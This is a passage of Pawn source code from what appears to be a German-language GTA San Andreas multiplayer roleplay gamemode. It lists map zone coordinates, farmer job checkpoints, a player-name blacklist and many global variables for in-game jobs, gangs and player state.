	{"Julius Thruway",         		{2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway",         		{2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway",         		{2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway",        		{2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway",        		{2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway",        		{2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
	{"Julius Thruway",        		{1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway",        		{1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway",        		{1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway",        		{1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway",        		{1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway",        		{1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway",        		{2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway",         		{1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway",         		{1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C.",     				{2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
	{"LV Airport",        			{1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"LV Airport",        			{1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"LV Airport",        			{1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"LV Airport",        			{1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"LS International",    		{1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"LS International",    		{1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"LS International",    		{1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"LS International",    		{1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"LS International",    		{1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"LS International",    		{2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery",     				{1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery",     				{1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland",     				{1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Pants",      		{1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial",         {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"4 Dragons Casino",         	{1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

//======= FARMER
new AktuellerCP[MAX_PLAYERS];
new Float:FarmerCPS[FarmerCheckpoints][3]={
{-6.9620,-3.0126,3.1172},
{-44.6214,-106.1540,3.1172},
{-29.8424,-110.8241,3.1172},
{3.5424,-19.4433,3.2688},
{11.3660,-28.8738,3.2688},
{-12.5866,-111.8622,3.2688},
{1.1049,-116.0905,3.2688},
{27.0255,-49.7425,3.2688},
{38.6914,-62.9952,3.2688},
{25.7187,-111.5493,3.2688},
{71.9206,-97.8545,3.2688},
{66.0800,-53.1640,3.2688},
{76.9987,24.5919,3.2688},
{66.8902,31.2640,3.2688},
{43.5753,-10.9666,3.2688},
{56.9552,38.7209,3.2688},
{52.3544,45.2587,3.2688},
{26.5335,10.6721,3.2688},
{20.8279,15.0424,3.2688},
{31.5244,62.2251,3.2688},
{16.9134,23.5104,3.2688},
{10.8291,32.5482,3.2688},
{22.7296,63.4379,3.2688},
{28.8027,100.3764,3.1172},
{-85.2832,165.7121,3.1172},
{-101.5498,151.8640,3.1412},
{-119.4854,98.1683,3.1412},
{-127.8824,99.4611,3.1412},
{-111.4970,153.2465,3.1412},
{-118.3234,156.4370,3.1412},
{-138.6117,102.2743,3.1412},
{-149.0449,105.5976,3.1412},
{-132.6515,160.5097,4.6568},
{-138.1478,163.1387,4.0606},
{-156.0332,109.9004,4.6568},
{-166.5363,113.2158,3.7128},
{-155.8644,163.9493,6.9285},
{-162.2225,167.6641,6.9285},
{-179.8257,122.0539,5.2715},
{-189.1053,122.9977,4.3336},
{-177.0821,173.7229,8.8140},
{-189.2290,176.5898,8.8140},
{-210.0755,138.2119,4.0343},
{-213.8596,121.6649,4.0343},
{-98.7655,72.5291,4.0343},
{-42.3994,128.1348,4.0343},
{-36.6881,61.0036,3.1172}
};

//==== Blacklist ====//

enum blackliste
{
    user1[MAX_PLAYER_NAME],
    user2[MAX_PLAYER_NAME],
    user3[MAX_PLAYER_NAME],
    user4[MAX_PLAYER_NAME],
    user5[MAX_PLAYER_NAME],
    user6[MAX_PLAYER_NAME],
    user7[MAX_PLAYER_NAME],
    user8[MAX_PLAYER_NAME],
    user9[MAX_PLAYER_NAME],
    user10[MAX_PLAYER_NAME],
};

new Blacklist[3][blackliste];

//==== ESSENPICKUPS ====//
new EssenPickup[4];



// .: TORE :.
new RS1;
new terrorgate;
new MVTor4;
new wheeltor;
//new schwarztor;
new vagostor;
new gangtor;
new gangtuer;
new tuer1;
new tuer2;
new MVTor2;
new MVTor3;
//new schwarzgatevar;
new Security = 0;
new CreatedCars[100];
new CreatedCar = 0;
new Tax = 0;
new TaxValue = 0;
new Jackpot = 0;
new StartingPaintballRound = 0;
new AnnouncedPaintballRound = 0;
new PaintballPlayers = 0;
new PaintballRound = 0;
new PaintballWinner = 999;
new PaintballWinnerKills= 0;
new StartingKartRound = 0;
new EndingKartRound = 0;
new AnnouncedKartRound = 0;
new KartingPlayers = 0;
new PayDayTeiler = 4;
new LCNMats, YakMats, TriadMats, GroveMats, BallasMats, BikerMats, VagosMats, AztecaMats, RSMats, TerrorMats, BrigadaMats, HitmanMats, SFRifaMats, WHMats, LSPDMats, FBIMats, LVPDMats;
new LCNDrugs, YakDrugs, TriadDrugs, GroveDrugs, BallasDrugs, BikerDrugs, VagosDrugs, AztecaDrugs, RSDrugs, TerrorDrugs, BrigadaDrugs, HitmanDrugs, SFRifaDrugs, WHDrugs;
new KartingRound = 0;
new FirstKartWinner = 999;
new SecondKartWinner = 999;
new ThirdKartWinner = 999;
new pIstTot[MAX_PLAYERS];
new PlayerBoxing[MAX_PLAYERS];
new Medics = 0;
new MedicCall = 999;
new FireCall = 999;
new CopCall = 999;
new CopCallTime[MAX_PLAYERS];
new MedicCallTime[MAX_PLAYERS];
new FireCallTime[MAX_PLAYERS];
new WCALL = 999;
new Mechanics = 0;
//new MechanicCall = 999;
new MechanicCallTime[MAX_PLAYERS];
new TaxiDrivers = 0;
new TaxiCall = 999;
new TaxiCallTime[MAX_PLAYERS];
new TaxiAccepted[MAX_PLAYERS];
new AdminDuty[MAX_PLAYERS];
new BusDrivers = 0;
new BusCall = 999;
new BusCallTime[MAX_PLAYERS];
new BusAccepted[MAX_PLAYERS];
new TransportDuty[MAX_PLAYERS];
new TransportValue[MAX_PLAYERS];
new TransportMoney[MAX_PLAYERS];
new TransportTime[MAX_PLAYERS];
new TransportCost[MAX_PLAYERS];
new TransportDriver[MAX_PLAYERS];
new JobDuty[MAX_PLAYERS];
new FWDuty[MAX_PLAYERS];
new RegistrationStep[MAX_PLAYERS];
new MapIconsShown[MAX_PLAYERS];
new OnCK[MAX_PLAYERS];
new GettingCK[MAX_PLAYERS];
new PlayerPaintballing[MAX_PLAYERS];
new PlayerPaintballKills[MAX_PLAYERS];
new PlayerKarting[MAX_PLAYERS];
new PlayerInKart[MAX_PLAYERS];
new SchoolSpawn[MAX_PLAYERS];
new TakingLesson[MAX_PLAYERS];
new UsedFind[MAX_PLAYERS];
new PlayersChannel[MAX_PLAYERS];
new WatchingTV[MAX_PLAYERS];
new NoFuel[MAX_PLAYERS];
new MatsHolding[MAX_PLAYERS];
new DivorceOffer[MAX_PLAYERS];
new ZigOffer[MAX_PLAYERS];
new MarriageCeremoney[MAX_PLAYERS];
new ProposeOffer[MAX_PLAYERS];
new ProposedTo[MAX_PLAYERS];
new GotProposedBy[MAX_PLAYERS];
new MarryWitness[MAX_PLAYERS];
new MarryWitnessOffer[MAX_PLAYERS];
new TicketOffer[MAX_PLAYERS];
new TicketMoney[MAX_PLAYERS];
new PlayerStoned[MAX_PLAYERS];
new ConsumingMoney[MAX_PLAYERS];
new BringingPaper[MAX_PLAYERS]; //Paper Boys must pick up a Paper first, then use /deliver
new GotPaper[MAX_PLAYERS]; //The player has a paper so he can use /read
new WritingPaper[MAX_PLAYERS]; //Used for onplayertext so he can type in lines
new WritingPaperNumber[MAX_PLAYERS]; //To which Paper in PaperInfo will it be written
new WritingLine[MAX_PLAYERS]; //Used for onplayertext to see which line he's at
new FishCount[MAX_PLAYERS];
new SpawnChange[MAX_PLAYERS];
new TutTime[MAX_PLAYERS];
new PlayerDrunk[MAX_PLAYERS];
new PlayerDrunkTime[MAX_PLAYERS];
new PlayerTazeTime[MAX_PLAYERS];
new FindTimePoints[MAX_PLAYERS];
new FindTime[MAX_PLAYERS];
new BoxWaitTime[MAX_PLAYERS];
new TestFishes[MAX_PLAYERS];
new PaperOffer[MAX_PLAYERS];
new BoxOffer[MAX_PLAYERS];
new CarOffer[MAX_PLAYERS];
new CarPrice[MAX_PLAYERS];
new CarID[MAX_PLAYERS];
new CarCalls[MAX_PLAYERS];
new GotHit[MAX_PLAYERS];
new GoChase[MAX_PLAYERS];
new GetChased[MAX_PLAYERS];
new OrderReady[MAX_PLAYERS];
new MedicTime[MAX_PLAYERS];
new NeedMedicTime[MAX_PLAYERS];
new MedicBill[MAX_PLAYERS];
new PlayerTied[MAX_PLAYERS];
new PlayerCuffed[MAX_PLAYERS];
new PlayerCuffedTime[MAX_PLAYERS];
new SkinStatus[MAX_PLAYERS];
new AnwaltPreis[MAX_PLAYERS];
new MechanikerAccept[MAX_PLAYERS];
new AnwaltStatus[MAX_PLAYERS];
new CarDarfKeyNetChangen[MAX_PLAYERS];
new CarPreisx[MAX_PLAYERS];
new CarStatus[MAX_PLAYERS];
new StatsStatus[MAX_PLAYERS];
new PaketStatus[MAX_PLAYERS];
new LiveOffer[MAX_PLAYERS];
new TalkingLive[MAX_PLAYERS];
new PlacedNews[MAX_PLAYERS];
new SelectChar[MAX_PLAYERS];
new SelectCharID[MAX_PLAYERS];
new SelectCharPlace[MAX_PLAYERS];
new ChosenSkin[MAX_PLAYERS];
new GettingJob[MAX_PLAYERS];
new GuardOffer[MAX_PLAYERS];
new GuardPrice[MAX_PLAYERS];
new CurrentMoney[MAX_PLAYERS];
new KickPlayer[MAX_PLAYERS];
new Robbed[MAX_PLAYERS];
new RobbedTime[MAX_PLAYERS];
new CP[MAX_PLAYERS];
new MoneyMessage[MAX_PLAYERS];
new Condom[MAX_PLAYERS];
new STDPlayer[MAX_PLAYERS];
new SexOffer[MAX_PLAYERS];
new SexPrice[MAX_PLAYERS];
new RepairOffer[MAX_PLAYERS];
new RepairPrice[MAX_PLAYERS];
new RefillOffer[MAX_PLAYERS];
new RefillPrice[MAX_PLAYERS];
new RepairCar[MAX_PLAYERS];
new DrugOffer[MAX_PLAYERS];
new DrugPrice[MAX_PLAYERS];
new DrugGram[MAX_PLAYERS];
new Mats[MAX_PLAYERS];
new JailPrice[MAX_PLAYERS];
new WantedPoints[MAX_PLAYERS];
new FarmFahrzeug[FFahrzeuge];
new TakeOver[MAX_PLAYERS];
//new sanisirene1[MAX_VEHICLES];
//new sanisirene[MAX_VEHICLES];
//

//
new Maske[MAX_PLAYERS];
new gPlayerUsingLoopingAnim[MAX_PLAYERS];
new gPlayerAnimLibsPreloaded[MAX_PLAYERS];
new Text:txtAnimHelper;
new KennzeichenErlaubnis[MAX_PLAYERS];
new KennzeichenErlaubnis1[MAX_PLAYERS];
new iVehicleObjective[MAX_VEHICLES][2];
new WantedLevel[MAX_PLAYERS];
new OnDuty[MAX_PLAYERS];
new FonDuty[MAX_PLAYERS];
new gPlayerCheckpointStatus[MAX_PLAYERS];
//new LSPDZellen;
new gPlayerLogged[MAX_PLAYERS];
new OfflineFlucht[MAX_PLAYERS];
new gPlayerLogTries[MAX_PLAYERS];
new gPlayerSpawned[MAX_PLAYERS];
new gActivePlayers[MAX_PLAYERS];
new gLastCar[MAX_VEHICLES];//301
new gOoc[MAX_PLAYERS];
new gNews[MAX_PLAYERS];
new gFam[MAX_PLAYERS];
new BigEar[MAX_PLAYERS];
new Spectatepos[MAX_PLAYERS];
new Spectate[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new StartTime[MAX_PLAYERS];
new HireCar[MAX_PLAYERS];
new SafeTime[MAX_PLAYERS];
new HidePM[MAX_PLAYERS];
new PhoneOnline[MAX_PLAYERS];
new gDice[MAX_PLAYERS];
new gGas[MAX_PLAYERS];
new gSpeedo[MAX_PLAYERS];
new gSpentCash[MAX_PLAYERS];
new Locator[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new ReportCall[MAX_PLAYERS];
new ReportCallNumber[MAX_PLAYERS];
new RingTone[MAX_PLAYERS];
new CallCost[MAX_PLAYERS];
new gPlayerAccount[MAX_PLAYERS];
new gLastDriverFixed[MAX_PLAYERS];
new gLastDriver[302];
